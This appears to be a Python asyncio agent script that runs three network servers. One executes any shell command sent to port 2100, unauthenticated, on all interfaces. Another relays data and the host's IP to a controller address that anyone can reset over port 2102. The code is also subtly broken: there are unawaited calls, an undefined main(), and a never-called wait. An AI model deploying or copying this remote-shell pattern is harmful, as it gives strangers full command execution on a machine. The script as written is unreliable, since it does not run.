import asyncio

import common

addr : str

async def command_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        command = reader.read()
        process = await asyncio.create_subprocess_shell(command, stdout=writer, stderr=writer)
        try:
            await process.communicate()
        finally:
            process.terminate()
            await process.wait
    finally:
        common.safe_close_socket(writer)

async def command_server():
    async with await asyncio.start_server(command_handler, '0.0.0.0', 2100) as server:
        server.serve_forever()


async def log_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        data = await reader.read()
        r, w = await asyncio.open_connection(addr, 2101)
        w.write(common.get_my_ip().encode() + b' ' + data)
        await w.drain()
    finally:
        common.safe_close_socket(writer)

async def log_server():
    async with await asyncio.start_server(log_handler, '0.0.0.0', 2101) as server:
        server.serve_forever()


async def addr_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        global addr
        addr = await reader.read()
    finally:
        common.safe_close_socket(writer)

async def addr_server():
    async with await asyncio.start_server(addr_handler, '0.0.0.0', 2102) as server:
        server.serve_forever()



if __name__ == '__main__':
    asyncio.run(main())
